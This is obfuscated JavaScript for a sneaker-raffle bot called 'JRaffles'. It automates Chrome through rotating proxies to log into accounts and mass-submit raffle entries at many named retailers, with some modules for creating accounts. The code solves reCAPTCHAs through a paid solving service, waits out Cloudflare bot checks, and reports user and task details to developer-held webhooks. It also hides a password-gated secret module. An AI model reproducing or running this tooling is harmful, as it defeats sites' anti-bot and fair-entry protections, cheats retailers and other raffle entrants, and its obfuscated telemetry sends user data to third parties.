async function _0x283add(_0x3b3e75, _0x136c21, _0x5c6052) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x6e4fe5 = 0x0; _0x6e4fe5 < _0x3b3e75['length']; _0x6e4fe5++) {
        var _0x1d4290 = '', _0x43dbb8 = 0x0, _0x559188;
        await _0x238b3c(_0x3b3e75, _0x6e4fe5), _0x57f604(_0x5c6052['name'] + '\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20/\x20' + _0x3b3e75['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        const _0x1995e3 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x3743c5 = Math['round'](Math['random']() * (_0x136c21['length'] - 0x1)), _0x27f259 = _0x136c21[_0x3743c5]['split'](':'), _0x46f6a1;
        try {
            _0x46f6a1 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x27f259[0x0] + ':' + _0x27f259[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x46f6a1 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x27f259[0x0] + ':' + _0x27f259[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x599dec = await _0x46f6a1['newPage'](), _0x11f1fb = await _0x599dec['target']()['createCDPSession'](), { windowId: _0xdc305c } = await _0x11f1fb['send']('Browser.getWindowForTarget');
            await _0x599dec['authenticate']({
                'username': '' + _0x27f259[0x2],
                'password': '' + _0x27f259[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x599dec['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x491ae3(0xbb8), await _0x11f1fb['send']('Browser.setWindowBounds', {
                'windowId': _0xdc305c,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x491ae3(0x1f40);
            try {
                await _0x599dec['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x491ae3(0x1388), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x599dec['type']('input[name=\x22email\x22]', '' + _0x3b3e75[_0x6e4fe5]['Email']), await _0x491ae3(0x1f4), await _0x599dec['type']('input[name=\x22password\x22]', '' + _0x3b3e75[_0x6e4fe5]['Password']), await _0x491ae3(0x258), await _0x599dec['$eval']('#login-form', _0x177a38 => _0x177a38['submit']()), await _0x599dec['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x491ae3(0x1f4), await _0x599dec['goto']('' + _0x3b3e75[_0x6e4fe5]['Url']), await _0x599dec['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3b3e75[_0x6e4fe5]['Size']);
            if (_0x3b3e75[_0x6e4fe5]['Size'] != 'RANDOM') {
                var _0x677bfe = '\x20' + _0x3b3e75[_0x6e4fe5]['Size'] + '\x20';
                const _0xa6f9a5 = await _0x599dec['$x']('//span[contains(text(),\x20' + _0x677bfe + ')]');
                await _0xa6f9a5[0x0]['click']();
            } else {
                const _0x4ab492 = await _0x599dec['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x2664ce = Math['round'](Math['random']() * (_0x4ab492['length'] - 0x1));
                await _0x4ab492[_0x2664ce]['click']();
            }
            await _0x491ae3(0x258), await _0x599dec['click']('#cookieChoiceDismiss'), await _0x491ae3(0x3e8), await _0x599dec['type']('#instagram-account', '' + _0x3b3e75[_0x6e4fe5]['Follower']), await _0x491ae3(0x28a), await _0x599dec['click']('#book-btn'), await _0x491ae3(0xbb8), await _0x599dec['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x491ae3(0x1f4), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20' + _0x1818b9['cyan']('Solving\x20Captcha')), await _0x599dec['solveRecaptchas'](), console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x491ae3(0x7d0), await _0x599dec['$eval']('#book-btn-for-sure', _0x17a148 => _0x17a148['click']()), await _0x491ae3(0x12c), await _0x599dec['click']('#book-btn-for-sure'), await _0x491ae3(0xdac);
            const _0x580b03 = await _0x599dec['$eval']('.reservation-popup\x20>\x20.title', _0x17f520 => {
                return _0x17f520['innerHTML'];
            });
            if (_0x580b03) {
                console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x3217e5 = await _0x344cc9(_0x3b3e75[_0x6e4fe5], _0x5c6052, 'dev', ![]), _0x5e4932 = await _0x344cc9(_0x3b3e75[_0x6e4fe5], _0x5c6052, 'pub', ![]);
                const _0x2ab738 = {
                    'succesDEVMSG': { 'embeds': [_0x3217e5] },
                    'succesPUBMSG': { 'embeds': [_0x5e4932] }
                };
                try {
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x2ab738['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x2ab738['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0x45ab34, _0x2ab738['succesPUBMSG']);
                } catch (_0x5c244d) {
                    console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5c244d));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x3e21f6) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20' + _0x3e21f6)), _0x559188 = '' + _0x3e21f6;
            var _0x3e1757 = await _0x344cc9(_0x3b3e75[_0x6e4fe5], _0x5c6052, 'dev', !![], _0x559188), _0x3217e5 = await _0x344cc9(_0x3b3e75[_0x6e4fe5], _0x5c6052, 'dev', ![]), _0x5e4932 = await _0x344cc9(_0x3b3e75[_0x6e4fe5], _0x5c6052, 'pub', ![]);
            const _0x738c40 = {
                'succesDEVMSG': { 'embeds': [_0x3217e5] },
                'succesPUBMSG': { 'embeds': [_0x5e4932] }
            };
            _0x738c40['errorDEV'] = { 'embeds': [_0x3e1757] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x738c40['errorDEV']), await _0xafb19d(_0x51c252, _0x738c40['errorDEV']), _0x3e21f6 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1d4290 = 'yes');
        } finally {
            _0x46f6a1['close']();
            if (_0x1d4290 == 'yes' && _0x43dbb8 != 0x5 && _0x559188 != 'Size\x20Not\x20Found') {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Task\x20' + (_0x6e4fe5 + 0x1) + '\x20:\x20Retrying')), _0x6e4fe5 = _0x6e4fe5 - 0x1, _0x43dbb8 = _0x43dbb8 + 0x1;
                continue;
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0x5c6052['name'] + ']\x20Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x59ed76() {
    await _0x45abb1(), console['clear']();
    if (_0x431e19 != 'devkey') {
        let _0x5b91cc = await _0xf2c255['autoUpdate']();
        if (_0x5b91cc === 'yes')
            return _0x1747e3('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1d3112 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x491ae3(0x2710);
        ;
    }
    await _0x5f1152(_0x1d3112);
    if (_0x51818c === ![])
        return console['log']('Closing\x20Browser'), await _0x491ae3(0xbb8);
    else
        try {
            var _0x198eda = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x54444c
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x431e19
                    }
                ]
            }];
            const _0x22c0ee = { 'embeds': _0x198eda };
            var _0x52db70 = await _0x344cc9(null, null, 'open', ![]);
            const _0x5c75e8 = { 'openDEVMSG': { 'embeds': [_0x52db70] } };
            await _0xafb19d(_0x3d6b43, _0x5c75e8['openDEVMSG']);
            async function _0x43d34b() {
                _0x57f604('JRaffles\x20' + _0x431e19), console['clear'](), console['log']('Welcome\x20to\x20' + _0x1818b9['cyan']('JRaffles();') + '\x20' + _0x431e19), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x320a09 = 0x0; _0x320a09 < _0x461b58['length'] - 0x3; _0x320a09++) {
                    if (_0x461b58[_0x320a09]['name'] === 'Reload\x20Settings' || _0x461b58[_0x320a09]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x320a09 + ')\x20[' + _0x461b58[_0x320a09]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x461b58['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x461b58['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x461b58['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x36de3b();
                if (taskModule > _0x461b58['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x491ae3(0x3e8), _0x43d34b();
                if (_0x461b58[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                    var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x5c9e21 = await _0x5c29d8(), _0x53d18f = await _0x4ba3ca();
                        await _0x2194b5(_0x53d18f, _0x5c9e21, _0x518498);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x5c9e21 = await _0x5c29d8(), _0x53d18f = await _0x4ba3ca();
                            await _0x4daae3(_0x53d18f, _0x5c9e21, _0x518498);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5c9e21 = await _0x5c29d8(), _0x436edf = await _0x5213c7(), _0x38192f = _0x436edf['split'](';');
                                await _0x452980(_0x38192f, _0x5c9e21, _0x518498);
                            }
                        }
                    }
                    return _0x43d34b();
                }
                if (_0x461b58[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                        var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5c9e21 = await _0x5c29d8(), _0xf1918 = await _0x4ba3ca();
                            await _0x283add(_0xf1918, _0x5c9e21, _0x518498);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c9e21 = await _0x5c29d8(), _0xf1918 = await _0x4ba3ca();
                                await _0xa1d532(_0xf1918, _0x5c9e21, _0x518498);
                            }
                        }
                    } catch (_0x555edd) {
                        console['log'](_0x555edd), await _0x491ae3(0xfa0);
                    }
                    return _0x43d34b();
                }
                if (_0x461b58[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                    var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c9e21 = await _0x5c29d8(), _0x45f3a9 = await _0x4ba3ca();
                    if (_0x45f3a9[0x0]['Url'] == '' || _0x45f3a9[0x0]['Url'] == undefined) {
                        await _0x48b206(_0x5c9e21);
                        var _0x456b64 = await _0x251601();
                        return await afewFunction('' + _0x444382[_0x456b64], 'nor', _0x518498, _0x45f3a9, _0x5c9e21), _0x43d34b();
                    }
                    return await afewFunction(_0x45f3a9[0x0]['Url'], 'nor', _0x518498, _0x45f3a9, _0x5c9e21), _0x43d34b();
                } else {
                    if (_0x461b58[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                        var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x5c9e21 = await _0x5c29d8(), _0x2dff57 = await _0x4ba3ca();
                            console['log']('Starting\x20' + _0x2dff57['length'] + '\x20MAHA\x20Tasks');
                            for (var _0xfb9e19 = 0x0; _0xfb9e19 < _0x2dff57['length']; _0xfb9e19++) {
                                console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x56bfed(_0xfb9e19, 'nor', _0x518498, _0x2dff57, _0x5c9e21), console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Sleeping\x20for\x20' + _0x401d1c['MahaDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['MahaDelay']);
                                } catch (_0x332bae) {
                                    console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Error\x20' + _0x332bae));
                                }
                            }
                            ;
                            return _0x43d34b();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5c9e21 = await _0x5c29d8();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x436edf = await _0x5213c7(), _0x38192f = _0x436edf['split'](';'), console['log'](_0x38192f['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0xfb9e19 = 0x0; _0xfb9e19 < _0x38192f['length']; _0xfb9e19++) {
                                    _0x518498['url'] = _0x38192f[_0xfb9e19], console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x56bfed(_0xfb9e19, 'ver', _0x518498, _0x2dff57, _0x5c9e21), console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Sleeping\x20for\x20' + _0x401d1c['verificationDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['verificationDelay']);
                                    } catch (_0x353c1d) {
                                        console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Error\x20' + _0x353c1d));
                                    }
                                }
                                ;
                                return _0x43d34b();
                            }
                        }
                    } else {
                        if (_0x461b58[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                            var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction], _0x5c9e21 = await _0x5c29d8(), _0x5a21c4 = await _0x4ba3ca();
                            return await _0x585537(_0x5a21c4, _0x5c9e21, _0x518498), await _0x491ae3(0x1388), _0x43d34b();
                        } else {
                            if (_0x461b58[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x5c9e21 = await _0x5c29d8(), _0x1aa1ca = await _0x4ba3ca();
                                    console['log']('Starting\x20' + _0x1818b9['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0xfb9e19 = 0x0; _0xfb9e19 < _0x1aa1ca['length']; _0xfb9e19++) {
                                        console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x164a5f(_0xfb9e19, 'nor', _0x518498, _0x1aa1ca, _0x5c9e21);
                                        } catch (_0x21e7e8) {
                                            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Task\x20failed\x20' + _0x21e7e8));
                                        }
                                        console['log'](_0x1e4ea5() + '\x20[' + _0x518498['name'] + ']\x20Sleeping\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
                                    }
                                    return _0x43d34b();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x5c9e21 = await _0x5c29d8();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x436edf = await _0x5213c7(), _0x38192f = _0x436edf['split'](';'), console['log'](_0x38192f['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0xfb9e19 = 0x0; _0xfb9e19 < _0x38192f['length']; _0xfb9e19++) {
                                            try {
                                                _0x518498['url'] = _0x38192f[_0xfb9e19], console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0xfb9e19 + 0x1) + ':\x20Getting\x20Session'), await _0x164a5f(_0xfb9e19, 'ver', _0x518498, null, _0x5c9e21), console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x401d1c['verificationDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['verificationDelay']);
                                            } catch (_0x2ca8a3) {
                                                console['log'](_0x2ca8a3), await _0x491ae3(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x43d34b();
                                    }
                                }
                                ;
                            } else {
                                if (_0x461b58[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                    var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x54f966('https://bouncewear.com/nl/account/register', _0x518498);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x461b58[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                        var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x5c9e21 = await _0x5c29d8(), _0x358b6a = await _0x4ba3ca();
                                            return await _0x1662c3('https://patta.nl/account/register', _0x518498, _0x358b6a, _0x5c9e21), _0x43d34b();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x5c9e21 = await _0x5c29d8(), _0x358b6a = await _0x4ba3ca();
                                                return await _0x5015ef('', _0x518498, _0x358b6a, _0x5c9e21), _0x43d34b();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x461b58[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                            var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5c9e21 = await _0x5c29d8(), _0x2a0619 = await _0x4ba3ca();
                                                return await _0x4085e5('https://slamjam.nl/account/register', _0x518498, _0x2a0619, _0x5c9e21), _0x43d34b();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5c9e21 = await _0x5c29d8(), _0x2a0619 = await _0x4ba3ca();
                                                    return await _0x1cc55b('', _0x518498, _0x2a0619, _0x5c9e21), _0x43d34b();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x461b58[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                                var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5c9e21 = await _0x5c29d8(), _0x10dcc1 = await _0x4ba3ca();
                                                    return await _0x5b6e3c('https://www.kickz.com/nl/login/', _0x518498, _0x10dcc1, _0x5c9e21), _0x43d34b();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5c9e21 = await _0x5c29d8(), _0x10dcc1 = await _0x4ba3ca();
                                                        return await _0x36008b(_0x518498, _0x10dcc1, _0x5c9e21), _0x43d34b();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x461b58[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x11fa5a(_0x461b58[taskModule]['modules']);
                                                    var _0x518498 = _0x461b58[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5c9e21 = await _0x5c29d8(), _0x509612 = await _0x4ba3ca();
                                                        return await _0x2084d5(_0x518498, _0x509612, _0x5c9e21), _0x43d34b();
                                                    }
                                                } else {
                                                    if (_0x461b58[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x491ae3(0x3e8), _0x43d34b();
                                                    else {
                                                        if (_0x461b58[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x3bcc6f = _0x461b58[taskModule]['name'], _0x5c9e21 = await _0x5c29d8();
                                                            const _0x2086eb = await _0x5213c7();
                                                            var _0x38192f = _0x2086eb['split'](';');
                                                            await _0x4b6c5f(_0x38192f, _0x3bcc6f, _0x5c9e21);
                                                        } else {
                                                            if (_0x461b58[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x38038d = 0x0;
                                                                for (const _0x1ce051 in _0x401d1c) {
                                                                    console['log']('(' + _0x38038d + ')\x20' + _0x1ce051 + '\x20:\x20' + _0x401d1c[_0x1ce051]), _0x38038d++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x38038d + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x25878d = await _0xdd8676();
                                                                if (_0x25878d == _0x38038d)
                                                                    return _0x43d34b();
                                                                console['clear'];
                                                                var _0x109a03 = 0x0;
                                                                for (var _0x3d355c in _0x401d1c) {
                                                                    if (_0x25878d == _0x109a03) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3d355c + '\x20:'), _0x401d1c[_0x3d355c] = await _0x493ea4(), _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c));
                                                                        break;
                                                                    } else
                                                                        _0x109a03++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x491ae3(0xbb8), _0x43d34b();
                                                            } else {
                                                                if (_0x461b58[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x45abb1(), _0x43d34b();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x461b58[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x3e9a9f = await _0x1db984();
                                                                        _0x3e9a9f == 'ModuleVoorDeBoys' ? (await _0x48b206(), await _0x251601(), await afewFunction(_0x444382[_0x456b64], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x491ae3(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x43d34b();
        } catch (_0xbdffa6) {
            return console['log'](_0xbdffa6), await _0x491ae3(0x3a98);
        }
}
;
_0x57f604('JRaffles\x20' + _0x431e19), _0x45abb1();
try {
    _0x59ed76();
} catch (_0x3e82ab) {
    var _0x5c8863 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x54444c
            },
            {
                'name': 'Version',
                'value': '' + _0x431e19
            },
            {
                'name': 'Error',
                'value': '' + _0x3e82ab
            }
        ]
    }];
    const _0x59bffb = { 'embeds': _0x5c8863 };
    _0xafb19d(_0x51c252, _0x59bffb);
}